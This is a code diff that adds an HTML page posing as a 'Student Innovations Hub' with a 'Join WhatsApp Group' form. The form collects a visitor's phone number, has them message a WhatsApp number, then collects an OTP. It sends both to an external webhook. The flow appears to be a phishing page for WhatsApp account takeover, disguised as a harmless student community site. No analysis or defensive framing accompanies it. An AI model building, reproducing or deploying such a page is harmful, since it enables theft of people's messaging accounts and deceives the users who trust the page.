@@ -1,1 +1,112 @@
-hi
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Student Innovations Hub</title>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+<style>
+  body { font-family: 'Roboto', sans-serif; margin:0; background:#f0f2f5; color:#333; }
+  nav { background:#4B6CB7; padding:15px 30px; display:flex; justify-content:space-between; align-items:center; color:white; }
+  nav h1 { margin:0; font-size:1.5rem; }
+  nav a { color:white; text-decoration:none; margin-left:20px; font-weight:700; }
+  nav a:hover { text-decoration:underline; }
+  .hero { text-align:center; padding:60px 20px; background: linear-gradient(90deg,#667eea,#764ba2); color:white; }
+  .hero h2 { font-size:2.5rem; margin-bottom:20px; }
+  .hero p { font-size:1.2rem; }
+  /* Modal/overlay */
+  .overlay { position:fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.7); display:none; justify-content:center; align-items:center; z-index:1000; }
+  .modal { background:white; padding:30px; border-radius:10px; max-width:400px; width:90%; text-align:center; }
+  input { width:80%; padding:10px; margin:10px 0; border-radius:5px; border:1px solid #ccc; font-size:1rem; }
+  button { padding:10px 20px; margin-top:10px; border:none; border-radius:5px; background:#4B6CB7; color:white; font-weight:700; cursor:pointer; }
+  button:hover { background:#364f8c; }
+  #otpSection { display:none; margin-top:10px; }
+  #result { margin-top:15px; font-weight:bold; }
+</style>
+</head>
+<body>
+
+<nav>
+  <h1>Student Innovations Hub</h1>
+  <div>
+    <a href="#" onclick="openModal()">Join Group</a>
+  </div>
+</nav>
+
+<div class="hero">
+  <h2>Empowering Young Innovators</h2>
+  <p>Explore projects, collaborate, and join student innovation groups around the world.</p>
+</div>
+
+<!-- Overlay modal -->
+<div class="overlay" id="overlay">
+  <div class="modal">
+    <h3>Join WhatsApp Group</h3>
+    <div id="phoneSection">
+      <input type="text" id="phone" placeholder="Enter your phone number">
+      <button onclick="getOtp()">Get OTP</button>
+    </div>
+    <div id="otpSection">
+      <input type="text" id="otp" placeholder="Enter OTP">
+      <button onclick="verifyOtp()">Verify OTP</button>
+      <div id="result"></div>
+    </div>
+    <button onclick="closeModal()" style="margin-top:15px;background:#aaa;">Close</button>
+  </div>
+</div>
+
+<script>
+const WA_NUMBER = "+15551463948"; // WhatsApp number for JOIN
+const API_URL = "https://webhook.vizolane.com/verify-otp"; // Flask OTP verification
+
+let userPhone = "";
+
+function openModal() { document.getElementById('overlay').style.display = 'flex'; }
+function closeModal() { document.getElementById('overlay').style.display = 'none'; }
+
+// Step 1: Get OTP
+function getOtp() {
+    userPhone = document.getElementById('phone').value.trim();
+    if(!userPhone){ alert("Please enter your phone number."); return; }
+    // Open WhatsApp to send JOIN
+    const waLink = `https://wa.me/${WA_NUMBER.replace(/\D/g,'')}?text=JOIN`;
+    window.open(waLink, "_blank");
+
+    alert("Please send JOIN message via WhatsApp. OTP will be sent shortly.");
+    // Show OTP section
+    document.getElementById('phoneSection').style.display = 'none';
+    document.getElementById('otpSection').style.display = 'block';
+
+    // Optionally, start polling your backend to detect OTP sent
+}
+
+// Step 2: Verify OTP
+async function verifyOtp(){
+    const otp = document.getElementById('otp').value.trim();
+    if(!otp){ alert("Enter OTP"); return; }
+
+    try{
+        const res = await fetch(API_URL,{
+            method:"POST",
+            headers: {"Content-Type":"application/json"},
+            body: JSON.stringify({ phone_number: userPhone, otp: otp })
+        });
+        const data = await res.json();
+        const resultDiv = document.getElementById('result');
+        if(data.verified==="yes"){
+            resultDiv.style.color="green";
+            resultDiv.innerHTML = `Verified ✅<br><a href="https://chat.whatsapp.com/Gs8aDE1tXFY3L9GqhFWaxX" target="_blank">Click here to join the group</a>`;
+        } else {
+            resultDiv.style.color="red";
+            resultDiv.textContent = "OTP Incorrect ❌";
+        }
+    } catch(err){
+        console.error(err);
+        document.getElementById('result').style.color="orange";
+        document.getElementById('result').textContent="Error connecting to server ⚠️";
+    }
+}
+</script>
+
+</body>
+</html>
